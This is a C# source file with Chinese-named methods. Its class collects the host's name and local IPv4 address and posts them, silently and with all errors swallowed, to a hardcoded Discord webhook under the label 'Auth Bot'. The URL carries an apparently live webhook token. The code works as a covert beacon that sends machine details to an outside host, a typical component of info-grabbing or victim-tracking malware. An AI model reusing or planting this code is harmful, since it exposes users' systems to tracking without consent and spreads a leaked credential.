using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

public static class 获
{
    private static readonly string webhookUrl = "https://discord.com/api/webhooks/1386419483324715078/0yiYysujhaFmUK5OVxX6qd5bDTpWzm0v8vTmQwTZW0L27s0PcepPmD7sras3EC0f6Pqn"; // ╰(*°▽°*)╯

    public static void 获址()
    {
        string 主机名 = 获取主机名();
        string 本地IP = 获取本地地址();
        发送到网络钩子(webhookUrl, 主机名, 本地IP).GetAwaiter().GetResult();
    }

    private static string 获取主机名()
    {
        try
        {
            return System.Net.Dns.GetHostName();
        }
        catch
        {
            return "Unknown";
        }
    }

    private static string 获取本地地址()
    {
        try
        {
            var 主机 = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            foreach (var 地址 in 主机.AddressList)
            {
                if (地址.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return 地址.ToString();
            }
        }
        catch { }
        return "Unknown";
    }

    private static async Task 发送到网络钩子(string 网络钩子地址, string 主机名, string 本地IP)
    {
        using (HttpClient 客户端 = new HttpClient())
        {
            string 内容 = $@"
{{
    ""embeds"": [
        {{
            ""title"": ""Information"",
            ""color"": 5814783,
            ""fields"": [
                {{
                    ""name"": ""Hostname"",
                    ""value"": ""{主机名}"",
                    ""inline"": true
                }},
                {{
                    ""name"": ""Local IP"",
                    ""value"": ""{本地IP}"",
                    ""inline"": true
                }}
            ],
            ""footer"": {{
                ""text"": ""Auth Bot""
            }},
            ""timestamp"": ""{DateTime.UtcNow:O}""
        }}
    ]
}}";

            var http内容 = new StringContent(内容, Encoding.UTF8, "application/json");
            try
            {
                var 响应 = await 客户端.PostAsync(网络钩子地址, http内容);
                响应.EnsureSuccessStatusCode();
            }
            catch
            {
            }
        }
    }
}
